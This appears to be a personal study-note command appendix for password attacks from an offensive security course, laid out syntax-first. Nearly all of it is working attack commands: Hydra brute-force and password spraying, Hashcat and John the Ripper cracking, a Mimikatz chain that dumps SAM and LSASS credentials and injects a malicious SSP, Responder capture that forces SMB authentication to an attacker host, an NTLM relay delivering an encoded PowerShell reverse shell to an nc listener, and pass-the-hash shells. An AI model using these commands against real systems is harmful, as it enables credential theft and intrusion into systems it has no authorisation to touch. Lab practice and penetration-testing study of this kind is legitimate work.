# Password Attacks — Command Appendix

Part of [[COMMAND APPENDIX]]. Syntax-first reference for credential-related tools: Hydra, Hashcat, JtR, Mimikatz, Responder, ntlmrelayx, impacket PtH tools. Full context and explanations live in [[Password Attacks]].

---

## Hydra

```bash
# SSH dictionary attack, non-standard port
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<target>

# RDP password spray (one password, many usernames -- stays under lockout threshold)
hydra -L users.txt -p "<password>" rdp://<target>

# HTTP POST form attack (get field names + failure string from Burp first)
# Three colon-separated fields: path : POST body with ^PASS^ : failure indicator
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> \
  http-post-form "/<path>:<fieldname>=^PASS^:<failure-string>"

# HTTP basic auth (WWW-Authenticate: Basic -- fastest Hydra target, no redirect)
hydra -l <user> -P /usr/share/wordlists/rockyou.txt http-get://<target>/

# RDP limits to 4 parallel tasks (-t 4); SSH defaults to 16
```

Key flags:

| Flag | Meaning |
|---|---|
| `-l <name>` | Single username |
| `-L <file>` | Username list |
| `-p <pass>` | Single password |
| `-P <file>` | Password list |
| `-s <port>` | Non-standard port |
| `-t <n>` | Parallel tasks |
| `-I` | Skip restore file (force restart) |

🔁 [[Password Attacks#16.1.1. SSH|16.1.1 SSH]], [[Password Attacks#16.1.2. RDP|16.1.2 RDP]], [[Password Attacks#16.1.3. HTTP POST Login Form|16.1.3 HTTP POST form]]

---

## Hashcat

```bash
# Benchmark your hardware (reference for cracking time estimates)
hashcat -b

# Crack an MD5 hash with rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Crack an NTLM hash (mode 1000, no salt, very fast)
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best66.rule --force

# Crack a Net-NTLMv2 hash (mode 5600, must include the full hash line)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

# Crack a KeePass database hash (mode 13400)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Crack an SSH private key passphrase (mode 22921 -- only if AES-256-CBC; use JtR for AES-256-CTR)
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force

# Rule-based mutation (append character, capitalise, etc.)
hashcat -m 0 hash.txt wordlist.txt -r demo.rule --force

# Debug: preview mutations without cracking (stdout mode)
hashcat -r demo.rule --stdout wordlist.txt

# Pre-built rule files
ls /usr/share/hashcat/rules/
# best66.rule, rockyou-30000.rule, dive.rule, d3ad0ne.rule
```

Hash modes quick reference:

| Mode | Algorithm | Notes |
|---|---|---|
| 0 | MD5 | General web hashes |
| 100 | SHA-1 | 40 hex chars |
| 1000 | NTLM | SAM dump, no salt |
| 5600 | Net-NTLMv2 | Responder capture, includes full challenge-response |
| 13400 | KeePass | keepass2john output |
| 22921 | RSA/DSA/EC key (AES-256-CBC) | ssh2john output, not all cipher modes |

🔁 [[Password Attacks#16.2.2. Mutating Wordlists|16.2.2 Mutating Wordlists]], [[Password Attacks#16.3.1. Cracking NTLM|16.3.1 NTLM]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 Net-NTLMv2]]

---

## John the Ripper (JtR)

```bash
# Extract hash from a KeePass .kdbx file
keepass2john database.kdbx > keepass.hash

# Extract hash from an SSH private key
ssh2john id_rsa > ssh.hash

# Crack with a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crack with a wordlist + custom JtR rules (added to john.conf)
john --wordlist=passwords.txt --rules=sshRules hash.txt

# Show cracked passwords
john --show hash.txt
```

JtR vs Hashcat: use JtR for SSH keys using AES-256-CTR cipher mode (Hashcat mode 22921 only supports AES-256-CBC). `ssh2john` output starting with `$sshng$6$` = SHA-512 key derivation, AES-256-CTR -- use JtR.

🔁 [[Password Attacks#16.2.4. Password Manager|16.2.4 KeePass]], [[Password Attacks#16.2.5. SSH Private Key Passphrase|16.2.5 SSH key]]

---

## Mimikatz

```
# Standard privilege chain (run in this order every time)
privilege::debug          # Enables SeDebugPrivilege -- required before any sensitive operation
token::elevate            # Impersonates SYSTEM token (needed for lsadump::sam)
lsadump::sam              # Dumps all local NTLM hashes from SAM database

# Dump cached domain credentials from LSASS memory
sekurlsa::logonpasswords  # Shows plaintext (if wdigest enabled) or encrypted blobs (Credential Guard)

# Credential Guard bypass: inject malicious SSP into LSASS
misc::memssp              # Hook SSPI layer; credentials captured to C:\Windows\System32\mimilsa.log

# Read the SSP log
# (exit Mimikatz first -- "type" is a shell command, not a Mimikatz command)
type C:\Windows\System32\mimilsa.log
```

> On Windows Server 2022: `lsadump::sam` fails even with a SYSTEM impersonation token because Windows checks the PRIMARY process token, not the thread token. Fix: run Mimikatz via `schtasks /ru <adminuser> /rp <password>` so the admin's token IS the primary token. See [[Password Attacks#16.3.2. Passing NTLM|16.3.2 lab section]] for the full schtask command.

🔁 [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]], [[Password Attacks#16.3.2. Passing NTLM|16.3.2]], [[Password Attacks#16.3.5. Windows Credential Guard|16.3.5]]

---

## Responder (Net-NTLMv2 capture)

```bash
# Start Responder on VPN interface (requires sudo for raw socket)
sudo responder -I tun0

# From a foothold on the victim: force an outbound SMB auth to Kali
dir \\<kali-ip>\test    # "Access is denied" is expected -- hash is still captured

# Captured hash format:
# <user>::<domain>:<challenge>:<response>:<blob>
# Save the full line to a file, then crack with hashcat -m 5600
```

🔁 [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]

---

## impacket-ntlmrelayx (NTLM relay)

```bash
# Relay intercepted SMB auth to a second target and execute a command
impacket-ntlmrelayx --no-http-server -smb2support \
  -t <relay-target-ip> \
  -c "powershell -enc <UTF-16LE-base64-payload>"

# Generate UTF-16LE base64 for PowerShell -enc (can't use pwsh on Linux for nested quotes)
python3 -c "
import base64
cmd = '<reverse-shell-oneliner>'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"

# nc listener to catch the relay-delivered shell
nc -nvlp 8080
```

Constraint: the relayed user must have local admin on the relay target. The relay target cannot be the same machine the auth came from.

🔁 [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4]]

---

## Pass-the-Hash (impacket + smbclient)

```bash
# Get an interactive SYSTEM shell via PtH (psexec always gives SYSTEM)
impacket-psexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>

# Get a shell as the authenticated user (wmiexec -- no file drop to disk)
impacket-wmiexec -hashes 00000000000000000000000000000000:<NThash> Administrator@<target>

# Access an SMB share without a plaintext password
smbclient \\\\<target>\\<share> -U Administrator --pw-nt-hash <NThash>
```

The LM hash portion is always 32 zeros on modern Windows (LM disabled since Vista/2008). Format: `LMhash:NThash`.

🔁 [[Password Attacks#16.3.2. Passing NTLM|16.3.2]]

#### Tags: #CommandAppendix #PasswordAttacks #Hydra #Hashcat #JohnTheRipper #Mimikatz #Responder #ntlmrelayx #PassTheHash #impacket #NetNTLMv2 #NTLM #CredentialGuard
